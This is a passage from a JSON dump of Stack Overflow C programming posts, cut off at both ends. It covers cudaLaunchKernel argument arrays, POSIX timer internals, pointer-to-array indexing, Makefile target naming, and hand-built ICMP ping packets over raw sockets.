12.0f;\nchar c = 'c';\nvoid *param[] = { (void*)&amp;a, (void*)&amp;b, (void*)&amp;c };\n\n// the element size of param\nsize_t size = sizeof(param)/sizeof(void*);\n</code></pre>\n\n<p>But now, I want <code>param</code> be passed to a function named <code>TryToGetTheSize</code>, and get a size as the return value.</p>\n\n<pre><code>size_t TryToGetTheSize(void **array)\n{\n     // return the size of void* array\n}\n\n...\n\nsize_t size = TryToGetTheSize(param);\n</code></pre>\n\n<p>I've tried an idea from the implementation of <code>strlen</code>, which incrementally moves the <code>char*</code> pointer to next continuous memory space, and counting by check the value of current position is <code>'\\0'</code> or not.</p>\n\n<p>But that method does not work with <code>void**</code>, there is no way to check the validation of <code>void*</code> indicated address.</p>\n\n<p>So, it seems impossible to know the size with only given the <code>void** array</code>, but when I lookup CUDA API, I found this:</p>\n\n<pre><code>cudaLaunchKernel(const void* func, dim3 gridDim, dim3 blockDim, void** args, size_t sharedMem, cudaStream_t stream)\n</code></pre>\n\n<p>In the CUDA, we usually use <code>&lt;&lt;&lt;&gt;&gt;&gt;</code> as kernel launching, but it's the same if we manually setup the arugments and call <code>cudaLaunchKernel</code> directly </p>\n\n<p>In <code>cudaLaunchKerenl</code> API, I notice the fourth parameter <code>args</code> used as parameters of kernel function <code>func</code>, and there is no other parameters describe the size of <code>args</code></p>\n\n<p>So, I have two questions:</p>\n\n<p>1) How does <code>cudaLaunchKernel</code> know the size of <code>void** args</code>? </p>\n\n<p>2) If <code>cudaLaunchKernel</code> doesn't need to know the size of <code>void** args</code>, how does it work?</p>\n\n<p>Here are my sample code that use <code>cudaLaunchKernel</code> instead of <code>&lt;&lt;&lt;&gt;&gt;&gt;</code> in kernel launching.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;cuda_runtime.h&gt;\n\n__global__\nvoid saxpy(int n, float a, float *x, float *y)\n{\n    int i = blockIdx.x * blockDim.x + threadIdx.x;\n    if (i &lt; n) y[i] = a * x[i] + y[i];\n}\n\nint main(void)\n{\n    int N = 1 &lt;&lt; 20;\n    float *hx, *hy, *dx, *dy;\n    hx = (float*)malloc(N * sizeof(float));\n    hy = (float*)malloc(N * sizeof(float));\n\n    cudaMalloc(&amp;dx, N * sizeof(float));\n    cudaMalloc(&amp;dy, N * sizeof(float));\n\n    for (int idx = 0; idx &lt; N; idx++)\n    {\n        hx[idx] = 1.0f;\n        hy[idx] = 2.0f;\n    }\n\n    cudaMemcpy(dx, hx, N * sizeof(float), cudaMemcpyHostToDevice);\n    cudaMemcpy(dy, hy, N * sizeof(float), cudaMemcpyHostToDevice);\n\n    unsigned int threads = 256;\n    unsigned int blocks = (N + 255) / threads;\n\n    float ratio = 2.0f;\n\n    //saxpy&lt;&lt;&lt;blocks, threads&gt;&gt;&gt;(N, ratio, dx, dy);\n\n    void *args[] = { &amp;N, &amp;ratio, &amp;dx, &amp;dy };\n    cudaLaunchKernel((void*)saxpy, dim3(blocks), dim3(threads), args, 0, NULL);\n\n    cudaMemcpy(hy, dy, N * sizeof(float), cudaMemcpyDeviceToHost);\n\n    float max_error = 0.0f;\n    for (int jdx = 0; jdx &lt; N; jdx++)\n    {\n        max_error = max(max_error, abs(hy[jdx] - 4.0f));\n    }\n\n    printf(\"Max Error: %f\\n\", max_error);\n\n    cudaFree(dx);\n    cudaFree(dy);\n    free(hx);\n    free(hy);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "timer", "linux-kernel", "posix"], "answers": [{"tags": [], "owner": {"reputation": 1585, "user_id": 421550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e7a2292ef4ad3674b556df31e81efce?s=128&d=identicon&r=PG", "display_name": "domen", "link": "https://stackoverflow.com/users/421550/domen"}, "is_accepted": false, "score": 0, "last_activity_date": 1545775155, "creation_date": 1545775155, "answer_id": 53925876, "question_id": 53920475, "link": "https://stackoverflow.com/questions/53920475/which-kernel-function-called-on-timer-settime-and-timer-handler-implemented-in/53925876#53925876", "title": "Which kernel function called on timer_settime() and timer handler implemented in User space?", "body": "<p><code>strace</code> your program and you will see which syscalls are used.</p>\n\n<p>In some cases this may depend on your libc, as kernel often offers multiple ways to achieve something.</p>\n"}], "owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 138, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545775155, "creation_date": 1545725028, "last_edit_date": 1545752402, "question_id": 53920475, "link": "https://stackoverflow.com/questions/53920475/which-kernel-function-called-on-timer-settime-and-timer-handler-implemented-in", "title": "Which kernel function called on timer_settime() and timer handler implemented in User space?", "body": "<p>I have a multi-threaded program where I have created a timer in main thread using <code>timer_create()</code> function. Then I set timer using <code>timer_settime()</code> function. When the timer expired after the timer duration it called the registered timer handler function.</p>\n\n<p>Here is my code snippet:</p>\n\n<pre><code>#define CLOCKID CLOCK_REALTIME\n#define SIG SIGRTMIN\nint ret;\ntimer_t timerid;\nstruct sigevent sev;\nstruct itimerspec its;\n\nsigset_t mask;\nstruct sigaction sa;\n\n\nstatic void handler(int sig, siginfo_t *si, void *uc)\n{\n\n}\n\nvoid *threadA(void *data_)\n{\n\n      while(1)\n      {\n\n        its.it_value.tv_sec = 0;\n        its.it_value.tv_nsec = DELAY1;\n        its.it_interval.tv_sec = 0;\n        its.it_interval.tv_nsec = 0;\n\n        ret = timer_settime(timerid, 0, &amp;its, NULL);\n        if ( ret &lt; 0 )\n            perror(\"timer_settime\");\n     }\n}\n\nint main(int argc, char *argv[])\n{\n      sa.sa_flags = SA_RESTART;\n      sa.sa_sigaction = handler;\n      sigemptyset(&amp;sa.sa_mask);\n      err = sigaction(SIG, &amp;sa, NULL);\n      if (0 != err) {\n           printf(\"sigaction failed\\n\"); }\n\n      sev.sigev_notify = SIGEV_SIGNAL;\n      sev.sigev_signo = SIG;\n      sev.sigev_value.sival_ptr = &amp;timerid;\n      ret = timer_create(CLOCKID, &amp;sev, &amp;timerid);\n      if ( ret &lt; 0 )\n           perror(\"timer_create\");\n\n}\n</code></pre>\n\n<p>I want to know which are functions are called in kernel space , when I call <code>timer_create()</code>, <code>timer_settime()</code> function inside my C program.</p>\n\n<p>Also, which kernel function is responsible to call timer handler when timer expires ?</p>\n\n<p>Inside <em><code>include/linux/posix-clock.h</code></em> file, I found following definitions, but no definition of those functions.</p>\n\n<pre><code>/**\n * struct posix_clock_operations - functional interface to the clock\n * @timer_create:   Create a new timer\n\n * @timer_settime: Set a timer's initial expiration and interval\n */     \n\nstruct posix_clock_operations {\n    struct module *owner;\n\n    int  (*timer_create) (struct posix_clock *pc, struct k_itimer *kit);\n\n\n\n    int  (*timer_settime)(struct posix_clock *pc,\n                          struct k_itimer *kit, int flags,\n                          struct itimerspec *tsp, struct\n                          timerspec *old);\n</code></pre>\n"}, {"tags": ["c", "language-lawyer"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545725259, "post_id": 53920369, "comment_id": 94683197, "body": "While at this I found a &quot;bug&quot; (EEE anyone) in MSVC. Apparently msvc considers <code>int (*)[]</code> to be <code>int (*)[0]</code>..."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1545725343, "post_id": 53920369, "comment_id": 94683213, "body": "@AnttiHaapala and is that taken from the first indexing?"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1545725712, "post_id": 53920369, "comment_id": 94683271, "body": "@SouravGhosh <a href=\"https://godbolt.org/z/MpwuNN\" rel=\"nofollow noreferrer\">nope...</a>"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545726214, "post_id": 53920369, "comment_id": 94683379, "body": "D&#39;oh and it is a duplicate :F - I thought I had done thorough search but couldn&#39;t find the duplicate except when searching for discussion on the MSVC bug. So I guess this is good to have here then."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1556726700, "post_id": 53920369, "comment_id": 98531304, "body": "By curiosity, why you do not delete your question being a duplicate in the same way you delete the ones written by other OP ?"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1556730991, "post_id": 53920369, "comment_id": 98533079, "body": "@bruno <a href=\"https://meta.stackoverflow.com/a/265737/918959\">meta.stackoverflow.com/a/265737/918959</a> - those few that I&#39;ve deleted are such that no one would <i>actually</i> find help for their problem by googling them. There are actually <i>other</i> close reasons that equally apply to them but they&#39;re also low quality duplicates."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1556731034, "post_id": 53920369, "comment_id": 98533098, "body": "@bruno Likewise I ask you: why can&#39;t I see you often casting a close vote..."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1556731102, "post_id": 53920369, "comment_id": 98533133, "body": "But I do close votes, what is the minimal value of often ^^ ? more seriously I do even I do not very like, it is not &#39;gentle&#39; for the OP (not sure is the right word, my poor English) even needed for stackoverflow quality"}], "answers": [{"comments": [{"owner": {"reputation": 29848, "user_id": 5958455, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lBWIE.png?s=128&g=1", "display_name": "iBug", "link": "https://stackoverflow.com/users/5958455/ibug"}, "edited": false, "score": 0, "creation_date": 1545724723, "post_id": 53920370, "comment_id": 94683102, "body": "Short answer: Function pointers cannot be used in pointer arithmetics."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 29848, "user_id": 5958455, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lBWIE.png?s=128&g=1", "display_name": "iBug", "link": "https://stackoverflow.com/users/5958455/ibug"}, "edited": false, "score": 0, "creation_date": 1545724928, "post_id": 53920370, "comment_id": 94683138, "body": "@iBug yes I was going to add that too, but it is besides the point."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 29848, "user_id": 5958455, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/lBWIE.png?s=128&g=1", "display_name": "iBug", "link": "https://stackoverflow.com/users/5958455/ibug"}, "edited": false, "score": 1, "creation_date": 1545725279, "post_id": 53920370, "comment_id": 94683201, "body": "@iBug true, but how is that an &quot;answer&quot; here?"}], "tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": true, "score": 4, "last_activity_date": 1545724656, "last_edit_date": 1592644375, "creation_date": 1545723939, "answer_id": 53920370, "question_id": 53920369, "link": "https://stackoverflow.com/questions/53920369/x-different-from-x0-when-x-is-a-pointer-to-an-array-of-undefined-dimensions/53920370#53920370", "title": "*x different from x[0] when x is a pointer to an array of undefined dimensions", "body": "<p>The 2 are not strictly equivalent. <code>a[0]</code> is exactly equivalent to <code>*(a + 0)</code> (<a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.5.2.1p2\" rel=\"nofollow noreferrer\">C11 6.5.2.1p2</a>).</p>\n<p>For <code>*</code>, <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.5.3.2p2\" rel=\"nofollow noreferrer\">C11 6.5.3.2p2</a> says that</p>\n<blockquote>\n<ol start=\"2\">\n<li>The operand of the unary <code>*</code> operator shall have pointer type.</li>\n</ol>\n</blockquote>\n<p>which <code>int (*)[]</code> is; the result of dereference <code>(*a)</code> is <code>int []</code>, which decays to <code>int *</code>, which is then indexed with <code>[2]</code>, which results in 3.</p>\n<p>However <code>a[0][2]</code> is equivalent to <code>(*(a + 0))[2]</code>, and here the rules of binary <code>+</code> operator apply first! <a href=\"http://port70.net/%7Ensz/c/c11/n1570.html#6.5.6p2\" rel=\"nofollow noreferrer\">C11 6.5.6p2</a> says that</p>\n<blockquote>\n<p><strong>Constraints</strong></p>\n<ol start=\"2\">\n<li>For addition, either both operands shall have arithmetic type, <strong>or one operand shall be a pointer to a complete object type</strong> and the other shall have integer type. (Incrementing is equivalent to adding 1.)</li>\n</ol>\n</blockquote>\n<p><code>0</code> has an integer type, and <code>a</code> is a pointer, but it is not a pointer to a complete object type, which means it does not match the constraints.</p>\n<p>Since this text occurs in the constraints section, a conforming compiler <strong>must</strong> diagnose this as constraint violation. As always, a conforming implementation may still correctly translate an invalid program, but at least GCC seems to reject this outright with an error message.</p>\n"}], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 3, "closed_date": 1545726328, "accepted_answer_id": 53920370, "answer_count": 1, "score": 1, "last_activity_date": 1545725192, "creation_date": 1545723939, "last_edit_date": 1545725192, "question_id": 53920369, "link": "https://stackoverflow.com/questions/53920369/x-different-from-x0-when-x-is-a-pointer-to-an-array-of-undefined-dimensions", "closed_reason": "Duplicate", "title": "*x different from x[0] when x is a pointer to an array of undefined dimensions", "body": "<p>I've thought that <code>a[0]</code> is equivalent to <code>*a</code>, but then I came across this piece of code:</p>\n\n<pre><code>int arr[] = {1, 2, 3};\nint (* a)[] = &amp;arr;\nprintf(\"%d\", (*a)[2]); // compiles\nprintf(\"%d\", a[0][2]); // errors out\n</code></pre>\n\n<p>There is a pointer to an array of unspecified size. The first expression compiles nicely, yet the second one results in </p>\n\n<pre><code>test.c:8:21: error: invalid use of array with unspecified bounds\n     printf(\"%d\", a[0][2]);\n                     ^\n</code></pre>\n\n<p>The error from Clang is</p>\n\n<pre><code>error: subscript of pointer to incomplete type 'int []'\n</code></pre>\n\n<p>and from MSVC v19.10</p>\n\n<pre><code>error C2036: 'int (*)[0]': unknown size\n</code></pre>\n\n<hr>\n\n<p>Why isn't <code>a[0]</code> equivalent to <code>*a</code>?</p>\n"}, {"tags": ["c", "makefile"], "comments": [{"owner": {"reputation": 81, "user_id": 9554211, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Shmuel Niraev", "link": "https://stackoverflow.com/users/9554211/shmuel-niraev"}, "edited": false, "score": 0, "creation_date": 1545731184, "post_id": 53920305, "comment_id": 94684360, "body": "I also would like to note that you can assume that firstTest and secondtests exist."}], "answers": [{"tags": [], "owner": {"reputation": 666, "user_id": 8953834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tRqhH.jpg?s=128&g=1", "display_name": "Ayoub Omari", "link": "https://stackoverflow.com/users/8953834/ayoub-omari"}, "is_accepted": false, "score": 0, "last_activity_date": 1545730821, "creation_date": 1545730821, "answer_id": 53921115, "question_id": 53920305, "link": "https://stackoverflow.com/questions/53920305/makefile-construction/53921115#53921115", "title": "Makefile construction", "body": "<p>The <code>make</code> command generates the files that are dependencies of the <code>all</code> target. This is why the generated file is called <code>main</code>.</p>\n\n<p>When you execute the command <code>make</code>, all files that are dependencies of the <code>all</code> target are generated. However when you have a command like <code>make first</code>. The make will start from the target <code>first</code> and execute the commands that will generate it.</p>\n\n<p>So <code>first</code> must be a target in the Makefile.</p>\n\n<p>As far as I am concerned the only way to change the name of the generated file is to change it in the Makefile like <code>gcc -g -Wall -o firstTest main.o</code></p>\n\n<p>or in the commandline by <code>make; mv main firstTest</code></p>\n"}, {"tags": [], "owner": {"reputation": 13458, "user_id": 1773798, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4Ljqn.png?s=128&g=1", "display_name": "Renaud Pacalet", "link": "https://stackoverflow.com/users/1773798/renaud-pacalet"}, "is_accepted": false, "score": 2, "last_activity_date": 1545731283, "last_edit_date": 1545731283, "creation_date": 1545730889, "answer_id": 53921121, "question_id": 53920305, "link": "https://stackoverflow.com/questions/53920305/makefile-construction/53921121#53921121", "title": "Makefile construction", "body": "<p>A <a href=\"https://www.gnu.org/software/make/manual/make.html#Last-Resort\" rel=\"nofollow noreferrer\">last-resort default rule</a> can do what you want: </p>\n\n<pre><code>.PHONY: all clean\n\nall: main\n\n%: main.o\n    gcc -g -Wall -o $@ $&lt;\n\nmain.o: main.c\n    gcc -g -Wall -c -o $@ $&lt;\n\nclean: \n    rm -f *.o main\n\nMakefile:;\n</code></pre>\n\n<p>Note the <code>Makefile:;</code> apparently useless rule. It is essential to tell make that the Makefile itself shall not be rebuilt with the last-resort default rule. Note also that the <code>clean</code> target cannot guess which executable names you decided to use and cannot delete them.</p>\n\n<p>Demo:</p>\n\n<pre><code>$ ls\nmain.c  Makefile\n$ make\nmake\ngcc -g -Wall -c -o main.o main.c\ngcc -g -Wall -o main main.o\n$ ls\nmain  main.c  main.o  Makefile\n$ make clean\nrm -f *.o main\n$ ls\nmain.c  Makefile\n$ make firstTest\ngcc -g -Wall -c -o main.o main.c\ngcc -g -Wall -o firstTest main.o\n$ ls\nfirstTest  main.c  main.o  Makefile\n$ make clean\nrm -f *.o main\n$ ls\nfirstTest  main.c  Makefile\n$ make secondTest\ngcc -g -Wall -c -o main.o main.c\ngcc -g -Wall -o secondTest main.o\n$ ls\nfirstTest  main.c  main.o  Makefile  secondTest\n$ make clean\nrm -f *.o main\n$ ls\nfirstTest  main.c  Makefile  secondTest\n</code></pre>\n"}], "owner": {"reputation": 81, "user_id": 9554211, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Shmuel Niraev", "link": "https://stackoverflow.com/users/9554211/shmuel-niraev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545731283, "creation_date": 1545723378, "last_edit_date": 1545730425, "question_id": 53920305, "link": "https://stackoverflow.com/questions/53920305/makefile-construction", "title": "Makefile construction", "body": "<p>Hi I am trying to construct a makefile for a c program named <code>main.c</code> (assume that it just prints <code>Hello World</code> to the screen) when typing <code>make</code> in the terminal it generate an executable called <code>main</code> but I don't want it to be <code>main</code>. I want to define the name of the executable in the terminal.for example when typing:</p>\n\n<pre><code>make firstTest\n</code></pre>\n\n<p>I want it generate an executable named <code>firstTest</code> and when typing:</p>\n\n<pre><code>make secondTest\n</code></pre>\n\n<p>I want it generate an executable named <code>secondTest</code>. My makefile code is:</p>\n\n<pre><code>all: main\n\nmain: main.o\n    gcc -g -Wall -o main main.o \n\nmain.o: main.c\n    gcc -g -Wall -c -o main.o main.c \n\n.PHONY: clean\n\nclean: \n    rm -f *.o main\n</code></pre>\n\n<p>How do I need to change it in order to achieve my goal?</p>\n"}, {"tags": ["c", "sockets", "networking", "ip", "raw-sockets"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 6484621, "user_type": "registered", "profile_image": "https://graph.facebook.com/1108640329216845/picture?type=large", "display_name": "Goutam Bose", "link": "https://stackoverflow.com/users/6484621/goutam-bose"}, "edited": false, "score": 0, "creation_date": 1545736576, "post_id": 53921250, "comment_id": 94685537, "body": "Hi, thanks for answering. Can you kindly provide some more information about it? Like what exactly is wrongly filled? What I&#39;m trying to do is send a ping request to the same device by filling the packet myself."}], "tags": [], "owner": {"reputation": 11, "user_id": 10313302, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YpOZgDz3QVk/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaN5LQKP5SrtFqWTwRsrrdzuPlHzvQ/mo/photo.jpg?sz=128", "display_name": "\u958b\u767c\u6e90", "link": "https://stackoverflow.com/users/10313302/%e9%96%8b%e7%99%bc%e6%ba%90"}, "is_accepted": false, "score": 0, "last_activity_date": 1545734144, "last_edit_date": 1545734144, "creation_date": 1545731824, "answer_id": 53921250, "question_id": 53919669, "link": "https://stackoverflow.com/questions/53919669/why-there-are-no-icmp-ping-requests-sent-when-wireshark-packet-capture-is-opened/53921250#53921250", "title": "Why there are no ICMP ping requests sent when wireshark packet capture is opened?", "body": "<p>Your ethernet header has some Wrongly filled.\nI run your program and use wireshark capture some wrongly packages.\nYour program can send package but that is not match ICMP protocol .So if you use filter ICMP , then nothing will be catch. On ethernet header has some error that causes subsequent protocols(ICMP) to be unresolved.</p>\n\n<pre><code>//Wireshark capture packet like below\nLinux cooked capture\n    Packet type: Send by us (4)\n    Link-layer address type: 1\n    Link-layer address length: 6\n    Source: PcsCompu_e8:b5:12(08:00:27:e8:b5:12)\n    Unused: 0000\n    Protocol: Unknown (0xd370)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 35, "user_id": 6484621, "user_type": "registered", "profile_image": "https://graph.facebook.com/1108640329216845/picture?type=large", "display_name": "Goutam Bose", "link": "https://stackoverflow.com/users/6484621/goutam-bose"}, "is_accepted": true, "score": 0, "last_activity_date": 1546512326, "creation_date": 1546512326, "answer_id": 54020749, "question_id": 53919669, "link": "https://stackoverflow.com/questions/53919669/why-there-are-no-icmp-ping-requests-sent-when-wireshark-packet-capture-is-opened/54020749#54020749", "title": "Why there are no ICMP ping requests sent when wireshark packet capture is opened?", "body": "<p>I finally figured out all the problems with the code. Okay so the problem were -</p>\n\n<ol>\n<li>The Destination and Source MAC were same which shouldn't be.</li>\n<li>The IP Checksum were not provided.</li>\n</ol>\n\n<p>The complete solution is - <a href=\"https://stackoverflow.com/questions/54006040/why-is-the-echo-ping-not-reaching-the-destination\">Why is the echo ping not reaching the destination?</a> (If it helps anybody)</p>\n"}], "owner": {"reputation": 35, "user_id": 6484621, "user_type": "registered", "profile_image": "https://graph.facebook.com/1108640329216845/picture?type=large", "display_name": "Goutam Bose", "link": "https://stackoverflow.com/users/6484621/goutam-bose"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1088, "favorite_count": 0, "accepted_answer_id": 54020749, "answer_count": 2, "score": 0, "last_activity_date": 1546512326, "creation_date": 1545716932, "question_id": 53919669, "link": "https://stackoverflow.com/questions/53919669/why-there-are-no-icmp-ping-requests-sent-when-wireshark-packet-capture-is-opened", "title": "Why there are no ICMP ping requests sent when wireshark packet capture is opened?", "body": "<p><strong>Summary : The sendto api in raw socket reports no error but the ICMP packet is not sent in wireshark packet capture.</strong></p>\n\n<p>I'm new in Raw Socket programming and trying to create a ICMP ping packet from scratch. I successfully created a ping program following this : <a href=\"https://www.geeksforgeeks.org/ping-in-c/\" rel=\"nofollow noreferrer\">https://www.geeksforgeeks.org/ping-in-c/</a> but now I wish to build also the ethernet header myself i.e all the packet headers from scratch. I did write the program following this : <a href=\"https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/\" rel=\"nofollow noreferrer\">https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/</a> but when I run it and capture the packet transfer using tcpdump and analyze it using Wireshark I find no ICMP packets sent, although according to my programming logic my packet has been successfully sent(since sendto api doesn't report any error). I'm attaching the code, any help will be really appreciated.</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n#include &lt;sys/types.h&gt; \n#include &lt;sys/socket.h&gt; \n#include &lt;netinet/in.h&gt; \n#include &lt;arpa/inet.h&gt; \n#include &lt;netdb.h&gt; \n#include &lt;unistd.h&gt; \n#include &lt;string.h&gt; \n#include &lt;stdlib.h&gt; \n#include &lt;netinet/ip_icmp.h&gt; \n#include &lt;time.h&gt; \n#include &lt;fcntl.h&gt; \n#include &lt;signal.h&gt; \n#include &lt;time.h&gt; \n#include &lt;string.h&gt;\n#include &lt;netinet/if_ether.h&gt; \n#include &lt;netpacket/packet.h&gt;\n#include &lt;net/ethernet.h&gt;\n#include &lt;net/if.h&gt;\n#include &lt;sys/ioctl.h&gt;\n\n\n#define PING_PKT_S 64 \n#define PORT_NO 0 \n#define PING_SLEEP_RATE 1000000 \n#define RECV_TIMEOUT 1 \n\nint pingloop=1; \n\nstruct ping_pkt \n{\n   struct ethhdr eth; \n   struct ip ip;    \n   struct icmphdr hdr; \n   char msg[PING_PKT_S-sizeof(struct icmphdr)]; \n}g_pckt; \n\n\ntypedef struct ping_ctx{\nint tos;\nint ttl;\nchar srcIP[200];\nchar dstIP[200];\nint r_sock;\n}ping_ctx;\n\nunsigned short checksum(void *b, int len) \n{\nunsigned short *buf = b; \nunsigned int sum=0; \nunsigned short result; \n\nfor ( sum = 0; len &gt; 1; len -= 2 ) \n    sum += *buf++; \nif ( len == 1 ) \n    sum += *(unsigned char*)buf; \nsum = (sum &gt;&gt; 16) + (sum &amp; 0xFFFF); \nsum += (sum &gt;&gt; 16); \nresult = ~sum; \nreturn result; \n} \n\n  void intHandler(int dummy) \n  { \npingloop=0; \n  } \n\n  void fill_ip_h(struct ip *ip, ping_ctx* ctx)\n  {\n    ip-&gt;ip_src.s_addr = inet_addr(ctx-&gt;srcIP);\n    ip-&gt;ip_dst.s_addr = inet_addr(ctx-&gt;dstIP);\n    ip-&gt;ip_v = 4;\n    ip-&gt;ip_hl = sizeof*ip &gt;&gt; 2;\n    ip-&gt;ip_tos = (unsigned char)(ctx-&gt;tos);\n    ip-&gt;ip_len = htons(sizeof(g_pckt));\n    ip-&gt;ip_id = htons(4321);\n    ip-&gt;ip_off = htons(0);\n    ip-&gt;ip_ttl = (unsigned char)(ctx-&gt;ttl);\n    ip-&gt;ip_p = 1;\n    ip-&gt;ip_sum = 0; /* Let kernel fills in */\n  }\n\n  void fill_icmp_h(struct icmphdr* hdr,int *msg_count)\n  {\n    hdr-&gt;type = ICMP_ECHO;\n    hdr-&gt;un.echo.id = 1; \n    hdr-&gt;un.echo.sequence = (*msg_count)++; \n  }\n\n  void fill_data(unsigned char * data)\n  {\nmemset(data, 'J', PING_PKT_S-sizeof(struct icmphdr));\n  }\n\n  void fill_eth(struct ethhdr* eth){\neth-&gt;h_source[0] = 0x08;\neth-&gt;h_source[1] = 0x00;\neth-&gt;h_source[2] = 0x27;\neth-&gt;h_source[3] = 0xe8;\neth-&gt;h_source[4] = 0xb5;\neth-&gt;h_source[5] = 0x12;\neth-&gt;h_dest[0] = 0x08;\neth-&gt;h_dest[1] = 0x00;\neth-&gt;h_dest[2] = 0x27;\neth-&gt;h_dest[3] = 